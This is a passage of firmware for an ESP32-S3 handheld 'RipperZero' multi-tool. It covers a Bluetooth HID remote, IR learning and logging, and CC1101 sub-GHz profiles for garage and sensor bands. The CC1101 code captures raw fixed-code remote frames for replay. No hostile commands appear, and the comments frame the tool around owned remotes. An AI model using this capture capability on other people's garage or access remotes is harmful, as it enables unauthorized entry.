    if (!ensure_ble_stack()) return false;

    // Bonding provides the encryption expected by Bluetooth HID. No PIN is
    // used; Apple TV completes the normal Bluetooth keyboard pairing flow.
    NimBLEDevice::setSecurityAuth(true, false, true);
    bluetooth_server = NimBLEDevice::createServer();
    if (bluetooth_server == NULL) {
      Serial.println("Bluetooth server creation failed");
      snprintf(bluetooth_start_message, sizeof(bluetooth_start_message),
               "BLUETOOTH START FAILED\n\nCould not create the Bluetooth\nservice. Restart Ripper and retry.");
      return false;
    }

    bluetooth_server->setCallbacks(new BluetoothServerCallbacks());
    bluetooth_server->advertiseOnDisconnect(true);
    bluetooth_hid = new NimBLEHIDDevice(bluetooth_server);
    bluetooth_hid->setManufacturer("Nick's RipperZero");
    bluetooth_hid->setPnp(0x02, 0x1234, 0x0001, 0x0100);
    bluetooth_hid->setHidInfo(0x00, 0x01);
    bluetooth_hid->setReportMap((uint8_t *)bluetooth_keyboard_report_map,
                                sizeof(bluetooth_keyboard_report_map));
    bluetooth_input_report = bluetooth_hid->getInputReport(0);
    bluetooth_hid->setBatteryLevel(100);

    NimBLEService *phone_control_service =
      bluetooth_server->createService(PHONE_CONTROL_SERVICE_UUID);
    phone_control_characteristic = phone_control_service->createCharacteristic(
      PHONE_CONTROL_CHARACTERISTIC_UUID,
      NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY |
      NIMBLE_PROPERTY::READ_ENC | NIMBLE_PROPERTY::WRITE_ENC
    );
    phone_control_characteristic->setCallbacks(new PhoneControlCallbacks());
    phone_control_characteristic->setValue("READY;COMMANDS=PING,STATUS,HOME,RF,IR");
    phone_control_service->start();
    bluetooth_server->start();

    NimBLEAdvertising *advertising = NimBLEDevice::getAdvertising();
    advertising->setAppearance(HID_KEYBOARD);
    advertising->addServiceUUID("1812");
    advertising->addServiceUUID(PHONE_CONTROL_SERVICE_UUID);
    advertising->setName("RipperZero Remote");
    bluetooth_ready = true;
    bluetooth_start_message[0] = '\0';
    Serial.println("Bluetooth HID keyboard ready");
  }

  NimBLEDevice::startAdvertising();
  Serial.println("Bluetooth keyboard advertising");
  refresh_connection_indicators();
  return true;
}


void send_bluetooth_key(uint8_t key) {
  if (!bluetooth_connected || bluetooth_input_report == NULL) {
    refresh_bluetooth_screen();
    return;
  }

  uint8_t report[8] = { 0, 0, key, 0, 0, 0, 0, 0 };
  bluetooth_input_report->notify(report, sizeof(report));
  uint8_t released[8] = {};
  bluetooth_input_report->notify(released, sizeof(released));
  set_status("TRANSMITTING", COLOR_BLUETOOTH);
}



void initialize_ir_receiver() {
  IrReceiver.begin(IR_RECEIVER_PIN, DISABLE_LED_FEEDBACK);
  ir_receiver_ready = true;
  Serial.printf("IR receiver decoder ready on GPIO%d\n", IR_RECEIVER_PIN);
}


void initialize_ir_transmitter() {
  // Use the ESP32-S3 RMT peripheral for the 38 kHz carrier instead of
  // IRremote's LEDC path. The latter can abort on this board when the display
  // and touch stack are active. RMT TX has its own hardware resources.
  ir_rmt_transmitter_ready = rmtInit(IR_TRANSMITTER_PIN, RMT_TX_MODE,
                                     RMT_MEM_NUM_BLOCKS_1, 1000000);
  if (ir_rmt_transmitter_ready) {
    // ESP32 Arduino Core 3 maps this argument to the driver's
    // polarity_active_low flag. Keep it false so the carrier is active-high
    // at the transistor base (the IR LED turns on during MARK periods).
    ir_rmt_transmitter_ready = rmtSetCarrier(IR_TRANSMITTER_PIN, true, false,
                                             38000, 0.33f) &&
                               rmtSetEOT(IR_TRANSMITTER_PIN, LOW);
  }
  ir_transmitter_ready = ir_rmt_transmitter_ready;
  Serial.printf("IR transmitter %s on GPIO%d (RMT carrier mode)\n",
                ir_transmitter_ready ? "ready" : "unavailable", IR_TRANSMITTER_PIN);
}


struct UnknownIrAnalysisRecord {
  uint32_t magic;
  uint32_t sequence;
  uint16_t raw_length;
  uint16_t shortest_us;
  uint32_t longest_us;
  uint32_t total_us;
  uint32_t fingerprint;
  char category[20];
  char date_time[24];
};


bool store_unknown_ir_analysis() {
  if (IrReceiver.decodedIRData.rawlen < 4) return false;

  UnknownIrAnalysisRecord record = {};
  record.magic = 0x49524131UL;
  record.raw_length = IrReceiver.decodedIRData.rawlen - 1;
  record.shortest_us = UINT16_MAX;
  record.fingerprint = 2166136261UL;
  strlcpy(record.category,
          (ir_guided_copy_active && ir_guided_device_name[0] != '\0') ?
            ir_guided_device_name : "UNKNOWN IR",
          sizeof(record.category));

  for (uint16_t i = 1; i < IrReceiver.decodedIRData.rawlen; i++) {
    const uint32_t duration =
      (uint32_t)IrReceiver.irparams.rawbuf[i] * MICROS_PER_TICK;
    record.total_us += duration;
    if (duration < record.shortest_us) record.shortest_us = duration;
    if (duration > record.longest_us) record.longest_us = duration;
    record.fingerprint ^= (duration / 10U);
    record.fingerprint *= 16777619UL;
  }
  if (record.shortest_us == UINT16_MAX) record.shortest_us = 0;

  if (rtc_ready && rtc.isClockIntegrityGuaranteed()) {
    RTC_DateTime now = rtc.getDateTime();
    format_clock_text(record.date_time, sizeof(record.date_time), now, true);
  } else {
    strlcpy(record.date_time, "DATE NOT SET", sizeof(record.date_time));
  }

  saved_preferences.begin("ripperzero", false);
  record.sequence = saved_preferences.getUInt("irRawSeq", 0) + 1;
  saved_preferences.putUInt("irRawSeq", record.sequence);
  const bool internal_saved =
    saved_preferences.putBytes("lastIrRaw", &record, sizeof(record)) == sizeof(record);
  saved_preferences.end();

  if (sd_card_ready) {
    File file = SD_MMC.open("/unknown_ir_analysis.csv", FILE_APPEND);
    if (file) {
      if (file.size() == 0) {
        file.println("sequence,date,category,raw_length,total_us,shortest_us,longest_us,fingerprint,timings_us");
      }
      file.printf("%lu,%s,%s,%u,%lu,%u,%lu,%08lX,\"",
                  (unsigned long)record.sequence, record.date_time,
                  record.category, record.raw_length,
                  (unsigned long)record.total_us, record.shortest_us,
                  (unsigned long)record.longest_us,
                  (unsigned long)record.fingerprint);
      for (uint16_t i = 1; i < IrReceiver.decodedIRData.rawlen; i++) {
        if (i > 1) file.print(';');
        file.print((uint32_t)IrReceiver.irparams.rawbuf[i] * MICROS_PER_TICK);
      }
      file.println("\"");
      file.close();
    }
  }
  Serial.printf("Unknown IR analysis #%lu stored: %u timings, fingerprint=%08lX%s\n",
                (unsigned long)record.sequence, record.raw_length,
                (unsigned long)record.fingerprint,
                sd_card_ready ? ", raw timings on SD" : "");
  return internal_saved;
}


void load_learned_ir_commands() {
  saved_preferences.begin("ripperzero", true);
  if (saved_preferences.getBytesLength("irPower") == sizeof(LearnedIrCommand)) {
    saved_preferences.getBytes("irPower", &learned_ir_power, sizeof(LearnedIrCommand));
  }
  saved_preferences.end();
}


void persist_learned_ir_power() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putBytes("irPower", &learned_ir_power, sizeof(LearnedIrCommand));
  saved_preferences.end();
}


void load_saved_ir_remotes() {
  bool migrate_legacy_remotes = false;
  saved_preferences.begin("ripperzero", true);
  saved_ir_remote_count = saved_preferences.getUChar("irRemoteCount", 0);
  if (saved_ir_remote_count > MAX_IR_SAVED_REMOTES) {
    saved_ir_remote_count = 0;
  }

  size_t stored_bytes = saved_preferences.getBytesLength("irRemotes");
  size_t expected = saved_ir_remote_count * sizeof(SavedIrRemoteRecord);
  size_t legacy_expected = saved_ir_remote_count * sizeof(SavedIrRemoteRecordV1);
  if (expected > 0 && stored_bytes == expected) {
    saved_preferences.getBytes("irRemotes", saved_ir_remotes, expected);
  } else if (legacy_expected > 0 && stored_bytes == legacy_expected) {
    SavedIrRemoteRecordV1 legacy_remotes[MAX_IR_SAVED_REMOTES] = {};
    saved_preferences.getBytes("irRemotes", legacy_remotes, legacy_expected);
    memset(saved_ir_remotes, 0, sizeof(saved_ir_remotes));
    for (uint8_t i = 0; i < saved_ir_remote_count; i++) {
      saved_ir_remotes[i].magic = legacy_remotes[i].magic;
      memcpy(saved_ir_remotes[i].name, legacy_remotes[i].name, sizeof(saved_ir_remotes[i].name));
      saved_ir_remotes[i].button_count = legacy_remotes[i].button_count;
      memcpy(saved_ir_remotes[i].button_names, legacy_remotes[i].button_names,
             sizeof(legacy_remotes[i].button_names));
      memcpy(saved_ir_remotes[i].buttons, legacy_remotes[i].buttons,
             sizeof(legacy_remotes[i].buttons));
    }
    migrate_legacy_remotes = true;
  } else if (expected > 0) {
    saved_ir_remote_count = 0;
  }
  saved_preferences.end();

  if (migrate_legacy_remotes) persist_saved_ir_remotes();

  if (saved_ir_remote_count > 0) {
    selected_ir_saved_index = 0;
  }
}


void persist_saved_ir_remotes() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putUChar("irRemoteCount", saved_ir_remote_count);
  saved_preferences.putBytes(
    "irRemotes",
    saved_ir_remotes,
    saved_ir_remote_count * sizeof(SavedIrRemoteRecord)
  );
  saved_preferences.end();
}


void load_saved_remote_layouts() {
  memset(saved_rf_layouts, 0, sizeof(saved_rf_layouts));
  memset(saved_ir_layouts, 0, sizeof(saved_ir_layouts));

  saved_preferences.begin("ripperzero", true);
  if (saved_preferences.getBytesLength("rfLayouts") == sizeof(saved_rf_layouts)) {
    saved_preferences.getBytes("rfLayouts", saved_rf_layouts, sizeof(saved_rf_layouts));
  }
  if (saved_preferences.getBytesLength("irLayouts") == sizeof(saved_ir_layouts)) {
    saved_preferences.getBytes("irLayouts", saved_ir_layouts, sizeof(saved_ir_layouts));
  }
  saved_preferences.end();
}


void persist_saved_remote_layouts() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putBytes("rfLayouts", saved_rf_layouts, sizeof(saved_rf_layouts));
  saved_preferences.putBytes("irLayouts", saved_ir_layouts, sizeof(saved_ir_layouts));
  saved_preferences.end();
}


void rf_command_storage_key(char *key, size_t key_size, uint8_t remote_index, uint8_t button_index) {
  snprintf(key, key_size, "rf%u_%u", remote_index, button_index);
}


void load_saved_rf_raw_commands() {
  memset(saved_rf_raw_commands, 0, sizeof(saved_rf_raw_commands));
  saved_preferences.begin("ripperzero", true);
  for (uint8_t remote = 0; remote < saved_remote_count; remote++) {
    for (uint8_t button = 0; button < MAX_UNIVERSAL_BUTTONS; button++) {
      char key[10];
      rf_command_storage_key(key, sizeof(key), remote, button);
      if (saved_preferences.getBytesLength(key) == sizeof(SavedRfRawCommand)) {
        saved_preferences.getBytes(key, &saved_rf_raw_commands[remote][button],
                                   sizeof(SavedRfRawCommand));
      }
    }
  }
  saved_preferences.end();
}


void persist_saved_rf_raw_command(uint8_t remote_index, uint8_t button_index) {
  if (remote_index >= MAX_SAVED_REMOTES || button_index >= MAX_UNIVERSAL_BUTTONS) return;
  char key[10];
  rf_command_storage_key(key, sizeof(key), remote_index, button_index);
  saved_preferences.begin("ripperzero", false);
  if (saved_rf_raw_commands[remote_index][button_index].valid) {
    saved_preferences.putBytes(key, &saved_rf_raw_commands[remote_index][button_index],
                               sizeof(SavedRfRawCommand));
  } else {
    saved_preferences.remove(key);
  }
  saved_preferences.end();
}


void clear_saved_rf_raw_commands(uint8_t remote_index) {
  if (remote_index >= MAX_SAVED_REMOTES) return;
  memset(saved_rf_raw_commands[remote_index], 0, sizeof(saved_rf_raw_commands[remote_index]));
  for (uint8_t button = 0; button < MAX_UNIVERSAL_BUTTONS; button++) {
    persist_saved_rf_raw_command(remote_index, button);
  }
}


void persist_saved_rf_raw_command_bank(uint8_t remote_index) {
  if (remote_index >= MAX_SAVED_REMOTES) return;
  for (uint8_t button = 0; button < MAX_UNIVERSAL_BUTTONS; button++) {
    persist_saved_rf_raw_command(remote_index, button);
  }
}


void refresh_saved_summary() {
  if (saved_summary_label == NULL) {
    return;
  }

  if (saved_remote_count == 0) {
    lv_label_set_text(saved_summary_label, "No saved remotes yet\n\nConfirmed discovery anchors\nwill appear here.");
    return;
  }

  if (selected_saved_index < 0 || selected_saved_index >= saved_remote_count) {
    selected_saved_index = 0;
  }
  char list_text[320] = "SAVED REMOTES\n";
  for (uint8_t i = 0; i < saved_remote_count; i++) {
    char line[40];
    snprintf(line, sizeof(line), "%c %d. %s\n", i == selected_saved_index ? '>' : ' ', i + 1, saved_remotes[i].name);
    strncat(list_text, line, sizeof(list_text) - strlen(list_text) - 1);
  }
  lv_label_set_text(saved_summary_label, list_text);
}


void load_saved_remotes() {
  saved_preferences.begin("ripperzero", true);
  saved_remote_count = saved_preferences.getUChar("remoteCount", 0);
  if (saved_remote_count > MAX_SAVED_REMOTES) {
    saved_remote_count = 0;
  }
  size_t expected = saved_remote_count * sizeof(SavedRemoteRecord);
  if (expected > 0 && saved_preferences.getBytesLength("remotes") == expected) {
    saved_preferences.getBytes("remotes", saved_remotes, expected);
  } else if (expected > 0) {
    saved_remote_count = 0;
  }
  saved_preferences.end();
}


void persist_saved_remotes() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putUChar("remoteCount", saved_remote_count);
  saved_preferences.putBytes(
    "remotes",
    saved_remotes,
    saved_remote_count * sizeof(SavedRemoteRecord)
  );
  saved_preferences.end();
}


void delete_latest_saved_remote(lv_event_t *e) {
  if (saved_remote_count == 0) {
    set_status("NO SAVED REMOTES", COLOR_MUTED);
    return;
  }

  saved_remote_count--;
  memset(&saved_rf_layouts[saved_remote_count], 0, sizeof(SavedRemoteLayout));
  clear_saved_rf_raw_commands(saved_remote_count);
  discovery_anchor_index = -1;
  persist_saved_remotes();
  persist_saved_remote_layouts();
  refresh_saved_summary();
  set_status("LAST REMOTE DELETED", COLOR_SAVED);
}


void save_discovery_anchor() {
  if (discovery_anchor_index < 0) {
    if (saved_remote_count >= MAX_SAVED_REMOTES) {
      set_status("SAVED REMOTES FULL", COLOR_RED);
      return;
    }
    discovery_anchor_index = saved_remote_count++;
  }

  SavedRemoteRecord &record = saved_remotes[discovery_anchor_index];
  record.magic = SAVED_REMOTE_MAGIC;
  snprintf(record.name, sizeof(record.name), "DISCOVERY %d", discovery_anchor_index + 1);
  strncpy(record.category, discovery_category, sizeof(record.category) - 1);
  record.category[sizeof(record.category) - 1] = '\0';
  record.candidate_index = discovery_candidate_index;
  record.has_anchor = true;
  record.button_count = 0;

  persist_saved_remotes();
  refresh_saved_summary();
}


// ============================================================
// CC1101 RADIO
// ============================================================

// These are receive/transmit starting points for discovery, not protocol
// decoders.  An unknown remote must still produce repeatable captures before
// anything may be saved or replayed.
struct RFProfilePreset {
  const char *name;
  float frequency;
  float bit_rate;
  float deviation;
  float bandwidth;
  bool ook;
};

const RFProfilePreset RF_PROFILES[] = {
  {"Hunter 434 OOK", 433.94, 4.8, 5.0, 68.0, true},
  // Flipper's asynchronous OOK presets use these 270/650 kHz bandwidths.
  {"Flipper 433 AM270", 433.92, 3.79, 5.0, 270.0, true},
  {"Flipper 433 AM650", 433.92, 3.79, 5.0, 650.0, true},
  // Flipper also provides three asynchronous 2-FSK receive presets.  These
  // are distinct modulation choices, not RSSI variations of OOK.
  {"Flipper 433 FSK2.4", 433.92, 4.8, 2.38, 270.0, false},
  {"Flipper 433 FSK12", 433.92, 4.8, 12.0, 270.0, false},
  {"Flipper 433 FSK47", 433.92, 4.8, 47.6, 270.0, false},
  {"Flipper 315 AM650", 315.00, 3.79, 5.0, 650.0, true},
  {"Regency 303.875 OOK", 303.875, 3.79, 5.0, 650.0, true},
  // Additional receive/learn starting points for common fixed-code remotes
  // and low-power sensors. A profile describes radio settings, not proof that
  // a particular brand or rolling-code product can be cloned.
  {"Garage 300 OOK", 300.00, 3.79, 5.0, 650.0, true},
  {"Garage 310 OOK", 310.00, 3.79, 5.0, 650.0, true},
  {"Sensors 345 OOK", 345.00, 3.79, 5.0, 650.0, true},
  {"Garage 390 OOK", 390.00, 3.79, 5.0, 650.0, true},
  {"EU Devices 868 OOK", 868.35, 4.80, 5.0, 270.0, true},
  {"US Sensors 915 FSK", 915.00, 38.40, 20.0, 270.0, false},
  // Extra asynchronous receive/learn profiles. These are radio starting
  // points only; the installed antenna must match the band for useful range.
  {"Flipper 315 AM270", 315.00, 3.79, 5.0, 270.0, true},
  {"Flipper 315 FSK2.4", 315.00, 4.80, 2.38, 270.0, false},
  {"Flipper 433 FSK9.6", 433.92, 9.60, 19.05, 270.0, false},
  {"Flipper 433 FSK38", 433.92, 38.40, 47.60, 270.0, false},
  {"Flipper 868 AM650", 868.35, 3.79, 5.0, 650.0, true},
  {"Flipper 915 AM650", 915.00, 3.79, 5.0, 650.0, true}
};
const uint8_t RF_PROFILE_COUNT = sizeof(RF_PROFILES) / sizeof(RF_PROFILES[0]);
uint8_t rf_profile_index = 0;  // Keep the known Hunter profile as the default.
int8_t rf_profile_suggested_index = -1;
float rf_profile_last_rssi = -140.0f;
uint32_t rf_profile_last_change_ms = 0;

uint8_t safe_rf_profile_index() {
  return rf_profile_index < RF_PROFILE_COUNT ? rf_profile_index : 0;
}

// RadioLib configures the normal CC1101 settings.  These small register sets
// add the AGC/data-slicer tuning used by Flipper's asynchronous AM presets.
// Keeping this helper local also avoids touching the display SPI bus.
void write_cc1101_register(uint8_t address, uint8_t value) {
#if CC1101_ACCESS_ENABLED
  cc1101_spi.beginTransaction(SPISettings(1000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CC1101_CS, LOW);
  cc1101_spi.transfer(address);
  cc1101_spi.transfer(value);
  digitalWrite(CC1101_CS, HIGH);
  cc1101_spi.endTransaction();
#else
  (void)address;
  (void)value;
#endif
}

void apply_flipper_ook_receive_tuning(bool bandwidth_650khz) {
  // CC1101 register addresses and values from Flipper Zero's public
  // OOK-270/OOK-650 asynchronous presets.  Frequency remains controlled by
  // RadioLib above; only the receive/demodulation behavior is adjusted here.
  const uint8_t registers[][2] = {
    {0x02, 0x0D}, // IOCFG0: async serial data on GDO0
    {0x03, bandwidth_650khz ? 0x07 : 0x47}, // FIFOTHR
    {0x08, 0x32}, // PKTCTRL0: async, infinite packet mode
    {0x0B, 0x06}, // FSCTRL1
    {0x0C, 0x00}, // MDMCFG0: 25 kHz channel spacing
    {0x0D, 0x00}, // MDMCFG1: 25 kHz channel spacing
    {0x10, bandwidth_650khz ? 0x17 : 0x67}, // MDMCFG4: RX bandwidth
    {0x11, 0x32}, // MDMCFG3: 3.79 kBaud
    {0x12, 0x30}, // MDMCFG2: ASK/OOK, no sync
    {0x13, 0x00},
    {0x14, 0x00},
    {0x18, 0x18}, // MCSM0
    {0x19, 0x18}, // FOCCFG
    {0x1B, bandwidth_650khz ? 0x07 : 0x03}, // AGCCTRL2
    {0x1C, 0x00}, // AGCCTRL1
    {0x1D, bandwidth_650khz ? 0x91 : 0x40}, // AGCCTRL0
    {0x20, 0xFB}, // WORCTRL
    {0x21, 0xB6}, // FREND1
    {0x22, 0x11}  // FREND0
  };
  for (uint8_t i = 0; i < sizeof(registers) / sizeof(registers[0]); i++) {
    write_cc1101_register(registers[i][0], registers[i][1]);
  }
}


void apply_flipper_fsk_receive_tuning(uint8_t deviation_register) {
  // Flipper's asynchronous 2-FSK presets.  RadioLib establishes the basic
  // frequency first; these registers then match the public Flipper receive
  // modem configuration (async GDO0, 4.798 kBaud, 270 kHz bandwidth).
  const uint8_t registers[][2] = {
    {0x02, 0x0D}, // IOCFG0: async serial data on GDO0
    {0x07, 0x04}, // PKTCTRL1
    {0x08, 0x32}, // PKTCTRL0: async, continuous
    {0x0B, 0x06}, // FSCTRL1
    {0x0C, 0x00}, // MDMCFG0
    {0x0D, 0x02}, // MDMCFG1
    {0x10, 0x67}, // MDMCFG4: 270 kHz RX bandwidth
    {0x11, 0x83}, // MDMCFG3: 4.798 kBaud
    {0x12, 0x04}, // MDMCFG2: 2-FSK, no sync
    {0x15, deviation_register},
    {0x18, 0x18}, // MCSM0
    {0x19, 0x16}, // FOCCFG
    {0x1B, 0x07}, // AGCCTRL2
    {0x1C, 0x00}, // AGCCTRL1
    {0x1D, 0x91}, // AGCCTRL0
    {0x20, 0xFB}, // WORCTRL
    {0x21, 0x56}, // FREND1
    {0x22, 0x10}  // FREND0
  };
  for (uint8_t i = 0; i < sizeof(registers) / sizeof(registers[0]); i++) {
    write_cc1101_register(registers[i][0], registers[i][1]);
  }
}

bool apply_rf_profile(uint8_t profile_index, bool announce = true) {
#if !CC1101_ACCESS_ENABLED
  (void)profile_index;
  return false;
#else
  if (profile_index >= RF_PROFILE_COUNT) return false;
  // Direct RX leaves the CC1101 and GDO0 in an asynchronous state. Return to
  // packet/idle mode before replacing its modem registers, particularly when
  // switching repeatedly between OOK and FSK from the touch profile menu.
  cc1101.packetMode();
  delay(2);
  const RFProfilePreset &profile = RF_PROFILES[profile_index];
  ConfigFSK_t config;
  config.frequency = profile.frequency;
  config.bitRate = profile.bit_rate;
  config.frequencyDeviation = profile.deviation;
  config.receiverBandwidth = profile.bandwidth;
  config.power = 0;

  int16_t state = cc1101.begin(config);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("CC1101 profile init failed: %d\n", state);
    return false;
  }
  state = cc1101.setOOK(profile.ook);
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("CC1101 modulation setup failed: %d\n", state);
    return false;
  }
  if (profile.ook && profile.bit_rate > 3.7 && profile.bit_rate < 3.9 &&
      (profile.bandwidth == 270.0 || profile.bandwidth == 650.0)) {
    apply_flipper_ook_receive_tuning(profile.bandwidth == 650.0);
  } else if (!profile.ook && profile.bit_rate > 4.7 && profile.bit_rate < 4.9 &&
             profile.bandwidth == 270.0) {
    uint8_t deviation_register = 0x04;
    if (profile.deviation > 30.0) deviation_register = 0x47;
    else if (profile.deviation > 8.0) deviation_register = 0x30;
    apply_flipper_fsk_receive_tuning(deviation_register);
  }
  rf_profile_index = profile_index;
  if (announce) {
    Serial.printf("CC1101 ready: %s (%.2f MHz %s)\n", profile.name,
                  profile.frequency, profile.ook ? "OOK" : "FSK");
  }
  return true;
#endif
}


void load_rf_profile_preference() {
  saved_preferences.begin("ripperzero", true);
  uint8_t stored_profile = saved_preferences.getUChar("rfProfile", 0);
  saved_preferences.end();
  if (stored_profile < RF_PROFILE_COUNT) {
    rf_profile_index = stored_profile;
  }
}


void persist_rf_profile_preference() {
  saved_preferences.begin("ripperzero", false);
  saved_preferences.putUChar("rfProfile", rf_profile_index);
  saved_preferences.end();
}

// A short receive-only profile scan.  Hold an owned remote close to the
// antenna while this runs; it selects a radio starting point, not a protocol.
bool scan_rf_profiles() {
#if !CC1101_ACCESS_ENABLED
  return false;
#else
  if (rf_capture_active) return false;
  const uint8_t previous_profile = safe_rf_profile_index();
  int8_t best_profile = -1;
  float best_rssi = -140.0f;
  const uint32_t scan_until = millis() + 3500;

  // Cycle through the presets for long enough that the person has time to
  // tap SCAN and then press/hold their remote.  The earlier single pass was
  // too short and only measured ambient noise.
  while ((int32_t)(millis() - scan_until) < 0) {
    for (uint8_t i = 0; i < RF_PROFILE_COUNT &&
         (int32_t)(millis() - scan_until) < 0; i++) {
      if (!apply_rf_profile(i, false)) continue;
      if (cc1101.receiveDirectAsync() != RADIOLIB_ERR_NONE) continue;
      delay(35);
      float peak = cc1101.getRSSI();
      for (uint8_t sample = 0; sample < 3; sample++) {
        delay(8);
        float rssi = cc1101.getRSSI();
        if (rssi > peak) peak = rssi;
      }
      cc1101.packetMode();
      if (peak > best_rssi) {
        best_rssi = peak;
        best_profile = i;
        Serial.printf("RF scan signal: %s peak=%.1f dBm\n", RF_PROFILES[i].name, peak);
      }
    }
  }
  if (best_profile < 0 || best_rssi < RF_CAPTURE_MIN_SIGNAL_DBM) {
    apply_rf_profile(previous_profile);
    Serial.printf("RF scan: no usable signal (best=%.1f dBm)\n", best_rssi);
    return false;
  }
  // RSSI cannot prove a protocol, but it can choose the strongest receive
  // starting point. Keep this internal so the user never has to manage radio
  // presets manually.
  rf_profile_last_rssi = best_rssi;
  rf_profile_suggested_index = best_profile;
  apply_rf_profile(best_profile, false);
  Serial.printf("RF scan selected: %s peak=%.1f dBm\n",
                RF_PROFILES[best_profile].name, rf_profile_last_rssi);
  return best_rssi >= RF_CAPTURE_MIN_SIGNAL_DBM;
#endif
}

uint8_t read_cc1101_status_register(uint8_t address) {
#if CC1101_ACCESS_ENABLED
  cc1101_spi.beginTransaction(
    SPISettings(1000000, MSBFIRST, SPI_MODE0)
  );

  digitalWrite(CC1101_CS, LOW);
  cc1101_spi.transfer(address | 0xC0);
  uint8_t value = cc1101_spi.transfer(0x00);
  digitalWrite(CC1101_CS, HIGH);

  cc1101_spi.endTransaction();
  return value;
#else
  (void)address;
  return 0;
#endif
}


bool initialize_cc1101() {
#if !CC1101_ACCESS_ENABLED
  Serial.println("CC1101 access disabled to preserve the display SPI bus");
  return false;
#else
  cc1101_spi.begin(
    CC1101_SCK,
    CC1101_MISO,
    CC1101_MOSI,
    CC1101_CS
  );

  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);
  delay(5);

  uint8_t partnum = read_cc1101_status_register(0x30);
  uint8_t version = read_cc1101_status_register(0x31);
  Serial.printf(
    "CC1101 SPI probe: PARTNUM=0x%02X VERSION=0x%02X\n",
    partnum,
    version
  );

  return apply_rf_profile(rf_profile_index);
#endif
}


bool initialize_e01_radio() {
#if !E01_ACCESS_ENABLED
  Serial.println("E01/nRF24 support installed but disabled pending verified wiring");
  return false;
#else
  // The CC1101 owns initialization of this SPI bus. RF24 uses transactions
  // with its independent CSN pin, allowing both radios to remain connected.
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);
  pinMode(E01_CSN_PIN, OUTPUT);
  digitalWrite(E01_CSN_PIN, HIGH);

  if (!e01_radio.begin(&cc1101_spi, E01_CE_PIN, E01_CSN_PIN)) {
    Serial.println("E01/nRF24 not detected");
    return false;
  }

  // Start conservatively. The PA/LNA module can draw sharp current peaks;
  // higher PA levels remain unavailable until its 3.3 V supply is validated.
  e01_radio.setPALevel(RF24_PA_MIN);
  e01_radio.setDataRate(RF24_1MBPS);
  e01_radio.setChannel(76);
  e01_radio.stopListening();
  e01_radio.powerDown();
  Serial.println("E01/nRF24 detected and parked in low-power mode");
  return true;
#endif
}


bool transmit_discovery_candidate() {
#if !CC1101_ACCESS_ENABLED
  return false;
#else
  if (!cc1101_ready) {
    return false;
  }

  set_status("TRANSMITTING", COLOR_SETTINGS);

  // A bounded low-power bring-up packet.  Future protocol templates replace
  // this payload only after a compatible device/protocol is selected.
  uint8_t candidate[] = {
    'R', 'Z', 'D',
    (uint8_t)discovery_candidate_index
  };

  int16_t state = cc1101.transmit(candidate, sizeof(candidate));
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("CC1101 transmit failed: %d\n", state);
    return false;
  }

  set_status("SYSTEM READY", COLOR_READY);

  Serial.printf("CC1101 test candidate %d sent\n", discovery_candidate_index + 1);
  return true;
#endif
}


void IRAM_ATTR rf_capture_edge() {
  // GDO2 is mapped to carrier-sense. Ignore demodulator chatter unless a
  // nearby transmitter is actually present.
  if (digitalRead(CC1101_GDO2) == LOW) {
    return;
  }

  rf_capture_carrier_seen = true;
  uint32_t now = micros();
  uint32_t previous = rf_capture_last_edge_us;

  if (previous == 0 || !rf_capture_active) {
    rf_capture_last_edge_us = now;
    return;
  }

  uint32_t duration = now - previous;
  if (duration < RF_CAPTURE_MIN_PULSE_US) {
    return;
  }

  rf_capture_last_edge_us = now;

  // A long quiet interval separates repeats of typical fixed-code remotes.
  // Keep only the newest complete-looking frame, not the idle gap itself.
  if (duration > RF_CAPTURE_FRAME_GAP_US) {
    rf_capture_edge_count = 0;
    return;
  }

  uint16_t index = rf_capture_edge_count;
  if (index < RF_CAPTURE_MAX_EDGES) {
    rf_capture_durations[index] = duration;
    rf_capture_edge_count = index + 1;
  }
}

// GDO2 is configured as the CC1101 carrier-sense output.  It is deliberately
// separate from GDO0: GDO0 carries the demodulated data, while this flag lets
// us begin the RMT recording only after a nearby transmitter is present.
void IRAM_ATTR rf_capture_carrier_detected() {
  if (rf_capture_active) {
    // Carrier sense is only a hint. The RSSI rise above the idle baseline is
    // what authorizes recording; otherwise steady nearby RF looks like a tap.
    rf_capture_gdo2_seen = true;
  }
}


bool start_rf_capture() {
#if !CC1101_ACCESS_ENABLED
  return false;
#else
  if (!cc1101_ready) {
    return false;
  }

  noInterrupts();
  rf_capture_edge_count = 0;
  rf_capture_last_edge_us = 0;
  rf_capture_active = true;
  rf_capture_ready = false;
  rf_capture_carrier_seen = false;
  rf_capture_gdo2_seen = false;
  rf_rmt_capture_started = false;
  rf_capture_peak_rssi = -140.0f;
  rf_capture_baseline_rssi = -140.0f;
  rf_capture_baseline_sum = 0.0f;
  rf_capture_baseline_samples = 0;
  rf_capture_armed_ms = millis();
  rf_capture_baseline_ready = false;
  interrupts();

  pinMode(CC1101_GDO0, INPUT);
  pinMode(CC1101_GDO2, INPUT);
  int16_t state = cc1101.receiveDirectAsync();
  if (state != RADIOLIB_ERR_NONE) {
    rf_capture_active = false;
    Serial.printf("CC1101 raw capture start failed: %d\n", state);
    return false;
  }

  state = cc1101.setDIOMapping(2, RADIOLIB_CC1101_GDOX_CARRIER_SENSE);
  if (state != RADIOLIB_ERR_NONE) {
    rf_capture_active = false;
    Serial.printf("CC1101 carrier-sense setup failed: %d\n", state);
    return false;
  }

  if (!rf_rmt_ready) {
    rf_rmt_ready = rmtInit(CC1101_GDO0, RMT_RX_MODE, RMT_MEM_NUM_BLOCKS_4, 1000000);
    if (rf_rmt_ready) rmtSetRxMaxThreshold(CC1101_GDO0, 25000);
  }
  if (!rf_rmt_ready) {
    rf_capture_active = false;
    Serial.println("RMT capture start failed");
    return false;
  }

  attachInterrupt(digitalPinToInterrupt(CC1101_GDO2), rf_capture_carrier_detected, RISING);

  Serial.printf("CC1101 capture armed: %s; measuring idle RF, then waiting for button\n",
                RF_PROFILES[safe_rf_profile_index()].name);
  return true;
#endif
}


